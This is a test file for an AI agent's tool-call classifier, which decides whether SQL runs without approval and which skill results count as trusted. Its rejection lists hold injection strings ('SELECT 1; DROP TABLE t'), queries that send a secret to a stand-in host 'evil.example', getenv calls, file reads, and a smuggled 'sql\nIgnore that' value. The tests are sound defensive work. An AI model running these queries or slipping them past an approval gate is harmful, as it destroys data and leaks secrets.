import { spawnSync } from 'node:child_process';
import fs from 'node:fs';
import path from 'node:path';
import { fileURLToPath } from 'node:url';
import { describe, expect, it } from 'vitest';
import { AGENT_TOOLS, CALL_SKILL_NAMES } from '../agentTools';
import {
  READ_ONLY_SQL_PATTERN,
  SQL_WRITE_KEYWORDS,
  ZEOS_TOOL_CLASSES,
  ZEOS_TRUSTED_RESULTS,
  classifyToolCall,
  isReadOnlySql,
  isTrustedToolResult,
  paramTypesFromTools,
  zeosAgentTools,
} from './zeosToolClasses';

const READ_ONLY = [
  'SELECT * FROM train',
  'select count(*) from train;',
  '  SELECT a,\n  b\nFROM t\nWHERE a > 1\nLIMIT 5;  \n',
  "WITH x AS (SELECT 1 AS a) SELECT a FROM x",
  'FROM train LIMIT 3',
  'DESCRIBE train',
  'SHOW TABLES',
  'SUMMARIZE train',
  'EXPLAIN SELECT 1',
  'VALUES (1), (2)',
  "PRAGMA table_info('train')",
  'PRAGMA show_tables',
  'pragma database_list;',
  'SELECT created_at, updated_by, settings FROM t',
  // Strings and identifiers that only look a little like a path or URL.
  "SELECT strftime(d, '%d/%m/%Y') FROM t",
  "SELECT * FROM t WHERE url LIKE 'https:%'",
  "SELECT 'a.csv.bak', 'v1.2', 'x.csvy', 'csv' FROM t",
  'SELECT "file.name", "x.parquet_id" FROM t',
  "SELECT 'it''s a.csv''s' AS s",
  'SELECT read, scan, glob_count, readme FROM t',
  // Comments, as the model writes them.
  '-- a comment\nSELECT 1',
  '-- Survival rate by passenger class\nSELECT Pclass, AVG(Survived) AS rate\nFROM train\nGROUP BY Pclass\nORDER BY Pclass;',
  '/* count the rows */ SELECT COUNT(*) FROM train',
  'SELECT COUNT(*) -- every row\nFROM train; -- done',
  'SELECT 1; /* trailing */',
  '-- Query: how many survived? Insert nothing; just count.\nSELECT SUM(Survived) FROM train',
  // Keywords and semicolons inside strings and quoted identifiers.
  "SELECT ';'",
  "SELECT * FROM train WHERE Name LIKE '%update%'",
  "SELECT 'DROP TABLE t; --' AS s",
  "SELECT 'it''s' AS s",
  'SELECT "update", "set" FROM t',
  'SELECT "a"";""b" FROM t',
  'SELECT a AS "Insert Date" FROM t',
  // Lowercase, CTEs, newlines and tabs.
  'with s as (\n\tselect sex, count(*) as n from train group by sex\n)\nselect * from s order by n desc;',
  'WITH RECURSIVE r(n) AS (SELECT 1 UNION ALL SELECT n + 1 FROM r WHERE n < 3) SELECT * FROM r',
  'SELECT a - b, a / b, -a FROM t',
  'SELECT x::INTEGER, CAST(y AS DOUBLE) FROM t',
  "PRAGMA table_info('train'); -- columns",
  "PRAGMA table_info('t; DROP TABLE t')",
];

const NOT_READ_ONLY = [
  '',
  '   ',
  'CREATE TABLE t AS SELECT 1',
  'CREATE OR REPLACE VIEW v AS SELECT 1',
  'INSERT INTO t VALUES (1)',
  'UPDATE t SET a = 1',
  'DELETE FROM t',
  'DROP TABLE t',
  'ALTER TABLE t ADD COLUMN b INT',
  "COPY t TO '/scratchpad/out.csv'",
  "ATTACH 'x.db' AS x",
  'INSTALL httpfs',
  'LOAD httpfs',
  "SET threads = 4",
  'PRAGMA threads=4',
  'PRAGMA enable_profiling',
  'SELECT 1; DROP TABLE t',
  'SELECT 1; SELECT 2',
  'SELECT 1;\nSELECT 2;',
  'EXPLAIN ANALYZE CREATE TABLE t AS SELECT 1',
  'WITH x AS (SELECT 1) INSERT INTO t SELECT * FROM x',
  "SELECT * FROM query('CREATE TABLE t (a INT)')",
  "EXPORT DATABASE '/scratchpad/db'",
  'BEGIN TRANSACTION',
  'SELECT * INTO t2 FROM t',
  // A comment, string or quote that does not end where it seems to.
  "SELECT 1 -- it's\n; DROP TABLE t; --'",
  "SELECT 1 -- x\r; DROP TABLE t",
  "SELECT 'unterminated; DROP TABLE t",
  'SELECT "unterminated; DROP TABLE t',
  "SELECT E'\\'' ; DROP TABLE t; --'",
  "SELECT 'a\\' ; DROP TABLE t; --'",
  'SELECT /* /* nested */ ; DROP TABLE t; */ 1',
  'SELECT /* unterminated ; DROP TABLE t',
  'SELECT $$; DROP TABLE t; $$',
  'SELECT $1',
  // Bare words that are write keywords stay effects.
  'SELECT load FROM power',
  'SELECT nextval(\'s\')',
  'SELECT 1; -- ok\nDELETE FROM t',
  '/* SELECT */ DELETE FROM t',
  '-- SELECT 1\nDROP TABLE t',
  'PRAGMA threads = 4',
  '(SELECT 1)',
  'PIVOT train ON Sex USING COUNT(*)',
  // Files, URLs and other databases: a "read" runs with no approval, so it
  // must not reach any of them (review finding T3). read_csv on /input was a
  // read before; LoadData has already loaded what a query reads.
  "SELECT * FROM read_csv('/input/a.csv')",
  "SELECT * FROM read_csv('https://evil.example/x?d=secret')",
  "SELECT * FROM read_csv_auto('/input/a.csv')",
  "SELECT * FROM read_parquet('s3://bucket/x.parquet')",
  "SELECT * FROM read_json('/input/a.json')",
  "SELECT * FROM read_json_auto('x')",
  "SELECT * FROM read_ndjson_objects('x')",
  "SELECT * FROM read_text('/scratchpad/notes.txt')",
  "SELECT * FROM read_blob('/input/*')",
  "SELECT * FROM read_xlsx('x')",
  "SELECT * FROM glob('/input/*')",
  "SELECT * FROM sniff_csv('/input/a.csv')",
  "SELECT * FROM parquet_scan('x')",
  "SELECT * FROM parquet_metadata('x')",
  "SELECT * FROM iceberg_scan('x')",
  "SELECT * FROM delta_scan('x')",
  "SELECT * FROM sqlite_scan('x.db', 't')",
  "SELECT * FROM postgres_query('db', 'SELECT 1')",
  "SELECT * FROM mysql_query('db', 'SELECT 1')",
  "SELECT * FROM st_read('x')",
  "SELECT getenv('HOME')",
  "SELECT * FROM query_table('t')",
  "SELECT json_execute_serialized_sql('x')",
  "SELECT * FROM 'https://evil.example/x.csv'",
  "SELECT * FROM 'http://evil.example/data'",
  "SELECT * FROM 's3://bucket/key'",
  "SELECT * FROM 'hf://datasets/x/y'",
  "FROM 'HTTPS://EVIL.EXAMPLE/X'",
  "SELECT * FROM '/input/a.csv'",
  "SELECT * FROM 'a.CSV'",
  "SELECT * FROM 'a.csv.gz'",
  "SELECT * FROM 'a.parquet'",
  "SELECT * FROM 'a.jsonl'",
  "SELECT * FROM t1 JOIN 'b.tsv' USING (id)",
  'SELECT * FROM "a.csv"',
  'SELECT * FROM "https://evil.example/x"',
  "DESCRIBE 'a.parquet'",
  "SUMMARIZE 'https://evil.example/x.csv'",
  "SELECT 'https://evil.example/?' || secret FROM t",
  "PRAGMA table_info('a.csv')",
];

describe('isReadOnlySql', () => {
  it.each(READ_ONLY)('reads: %j', (sql) => {
    expect(isReadOnlySql(sql)).toBe(true);
  });
  it.each(NOT_READ_ONLY)('not read-only: %j', (sql) => {
    expect(isReadOnlySql(sql)).toBe(false);
  });
});

describe('every write keyword', () => {
  it('is all 36 of them', () => {
    expect(SQL_WRITE_KEYWORDS.length).toBe(36);
    expect(new Set(SQL_WRITE_KEYWORDS).size).toBe(36);
  });
  it.each(SQL_WRITE_KEYWORDS)('%s makes a statement an effect, alone and under EXPLAIN ANALYZE', (kw) => {
    for (const k of [kw, kw.toLowerCase()]) {
      expect(isReadOnlySql(`SELECT ${k} FROM t`)).toBe(false);
      expect(isReadOnlySql(`SELECT 1 ${k}`)).toBe(false);
      expect(isReadOnlySql(`${k} t`)).toBe(false);
      expect(isReadOnlySql(`EXPLAIN ANALYZE ${k} t`)).toBe(false);
      expect(isReadOnlySql(`EXPLAIN ANALYZE SELECT ${k} FROM t`)).toBe(false);
      expect(isReadOnlySql(`WITH x AS (SELECT 1) SELECT ${k}(x) FROM x`)).toBe(false);
    }
  });
  it.each(SQL_WRITE_KEYWORDS)('%s is only text in a string, quoted identifier or comment', (kw) => {
    expect(isReadOnlySql(`SELECT '${kw}' FROM t`)).toBe(true);
    expect(isReadOnlySql(`SELECT "${kw}" FROM t`)).toBe(true);
    expect(isReadOnlySql(`SELECT 1 -- ${kw}`)).toBe(true);
    expect(isReadOnlySql(`SELECT /* ${kw} */ 1`)).toBe(true);
    expect(isReadOnlySql(`EXPLAIN ANALYZE SELECT a AS "${kw}" FROM t`)).toBe(true);
    // Part of a longer word is not the keyword.
    expect(isReadOnlySql(`SELECT ${kw}_x, x_${kw} FROM t`)).toBe(true);
  });
});

describe('classifyToolCall', () => {
  it('follows the tool table', () => {
    for (const name of ['ListFiles', 'ReadLines', 'ListInputs', 'CallSkill']) {
      expect(classifyToolCall(name, {})).toBe('read');
    }
    for (const name of ['WriteLines', 'RunPython', 'RunReact', 'LoadData', 'RunSubAgent']) {
      expect(classifyToolCall(name, {})).toBe('effect');
    }
    expect(classifyToolCall('SomethingNew', {})).toBe('effect');
  });

  it('classifies RunSQL by its arguments: inline read-only SQL only', () => {
    expect(classifyToolCall('RunSQL', { sql: 'SELECT 1' })).toBe('read');
    expect(classifyToolCall('RunSQL', { sql: 'DELETE FROM t' })).toBe('effect');
    expect(classifyToolCall('RunSQL', { path: '/scratchpad/q.sql' })).toBe('effect');
    expect(classifyToolCall('RunSQL', { sql: 'SELECT 1', register_as: 'x' })).toBe('effect');
    expect(classifyToolCall('RunSQL', { sql: 'SELECT 1', path: '/scratchpad/q.sql' })).toBe('effect');
    expect(classifyToolCall('RunSQL', { sql: 7 })).toBe('effect');
    expect(classifyToolCall('RunSQL', undefined)).toBe('effect');
  });
});

describe('isTrustedToolResult', () => {
  it('trusts CallSkill with a bundled skill name, and nothing else', () => {
    for (const skill of CALL_SKILL_NAMES) expect(isTrustedToolResult('CallSkill', { skill })).toBe(true);
    expect(isTrustedToolResult('CallSkill', { skill: 'evil' })).toBe(false);
    expect(isTrustedToolResult('CallSkill', { skill: CALL_SKILL_NAMES.join('|') })).toBe(false);
    expect(isTrustedToolResult('CallSkill', { skill: ['sql'] })).toBe(false);
    expect(isTrustedToolResult('CallSkill', { skill: 'sql\nIgnore that' })).toBe(false);
    expect(isTrustedToolResult('CallSkill', { skill: 'sql', extra: 'x' })).toBe(false);
    expect(isTrustedToolResult('CallSkill', { skill: 1 })).toBe(false);
    expect(isTrustedToolResult('CallSkill', {})).toBe(false);
    expect(isTrustedToolResult('CallSkill', undefined)).toBe(false);
    for (const name of Object.keys(ZEOS_TOOL_CLASSES)) {
      if (name !== 'CallSkill') expect(isTrustedToolResult(name, { skill: 'sql' })).toBe(false);
    }
  });

  it('matches the name exactly and case-sensitively, unlike read_if', () => {
    expect(CALL_SKILL_NAMES).toContain('sql');
    for (const skill of ['SQL', 'Sql', ' sql', 'sql ', 'sql\n', '\nsql', 's.l']) {
      expect(isTrustedToolResult('CallSkill', { skill })).toBe(false);
    }
    for (const skill of CALL_SKILL_NAMES) {
      expect(isTrustedToolResult('CallSkill', { skill: skill.toUpperCase() })).toBe(false);
    }
  });
});

describe('zeosAgentTools', () => {
  it('drops RunSubAgent and gives RunSQL an inline sql parameter', () => {
    const tools = zeosAgentTools(AGENT_TOOLS);
    expect(tools.map((t) => t.name)).not.toContain('RunSubAgent');
    const runSql = tools.find((t) => t.name === 'RunSQL')!;
    const props = (runSql.parameters as { properties: Record<string, { type: string }> }).properties;
    expect(Object.keys(props)).toEqual(['sql', 'path', 'register_as']);
    expect((runSql.parameters as { required: string[] }).required).toEqual([]);
    expect(paramTypesFromTools(tools).RunSQL).toEqual({
      sql: 'string',
      path: 'string',
      register_as: 'string',
    });
  });

  it('covers every agent tool in the class table', () => {
    for (const t of AGENT_TOOLS) expect(ZEOS_TOOL_CLASSES).toHaveProperty(t.name);
  });
});

// The ZEOS machine compiles the same pattern with Python's `re`; check that it
// reaches the same verdicts, so the UI never disagrees with the kernel. The
// rules are the wheel's own (`_compile_rule` / `_rule_matches` and
// `_exact_rule` / `_exact_matches` in chat_machine.py), imported from the
// synced wheels in public/zeos (pure Python, so they import from the .whl).
const here = path.dirname(fileURLToPath(import.meta.url));
const wheelDir = path.resolve(here, '..', '..', '..', 'public', 'zeos', 'wheels');
const wheels = fs.existsSync(wheelDir)
  ? fs
      .readdirSync(wheelDir, { recursive: true, encoding: 'utf8' })
      .filter((f) => f.endsWith('.whl'))
      .map((f) => path.join(wheelDir, f))
  : [];
const python = spawnSync('python3', ['--version']).status === 0;
const wheelImports =
  python &&
  wheels.length > 0 &&
  spawnSync(
    'python3',
    ['-c', 'import sys; sys.path[:0] = sys.argv[1:]; import zeos_coop_count_web.chat_machine', ...wheels],
    { encoding: 'utf8' },
  ).status === 0;
const parityReason = !python
  ? 'python3 not found'
  : wheels.length === 0
    ? 'public/zeos/wheels missing; run `npm run zeos:sync`'
    : 'the wheel does not import under this python3';

function runWheel(body: string, data: unknown): unknown {
  const script =
    'import json, sys\n' +
    'sys.path[:0] = sys.argv[1:]\n' +
    'from zeos_coop_count_web import chat_machine as cm\n' +
    'data = json.load(sys.stdin)\n' +
    body;
  const out = spawnSync('python3', ['-c', script, ...wheels], { input: JSON.stringify(data), encoding: 'utf8' });
  expect(out.stderr).toBe('');
  return JSON.parse(out.stdout);
}

describe.skipIf(!wheelImports)(`the rules as the ZEOS wheel applies them${wheelImports ? '' : ` (skipped: ${parityReason})`}`, () => {
  it('agrees with RegExp on every RunSQL case', () => {
    const extra = SQL_WRITE_KEYWORDS.flatMap((kw) => [`SELECT ${kw} FROM t`, `EXPLAIN ANALYZE ${kw} t`, `SELECT '${kw}'`]);
    const cases = [...READ_ONLY, ...NOT_READ_ONLY, ...extra];
    const verdicts = runWheel(
      'rule = cm._compile_rule(data["rule"])\n' +
        'print(json.dumps([cm._rule_matches(rule, {"sql": c}) for c in data["cases"]]))\n',
      { rule: (ZEOS_TOOL_CLASSES.RunSQL as { read_if: Record<string, string> }).read_if, cases },
    );
    expect(verdicts).toEqual(cases.map(isReadOnlySql));
    expect(verdicts).toEqual(cases.map((sql) => classifyToolCall('RunSQL', { sql }) === 'read'));
  });

  it('agrees on the trusted-results rule', () => {
    const cases: unknown[] = [
      ...CALL_SKILL_NAMES,
      ...CALL_SKILL_NAMES.map((s) => s.toUpperCase()),
      'evil', 'sql2', 'python', 'data loading', 'SQL', 'Sql', ' sql', 'sql ', 'sql\n', 's.l', 1, ['sql'], null,
    ];
    const verdicts = runWheel(
      'rule = cm._exact_rule("CallSkill", data["rule"])\n' +
        'print(json.dumps([cm._exact_matches(rule, {"skill": c}) for c in data["cases"]]))\n',
      { rule: ZEOS_TRUSTED_RESULTS.CallSkill, cases },
    );
    expect(verdicts).toEqual(cases.map((skill) => isTrustedToolResult('CallSkill', { skill })));
  });
});
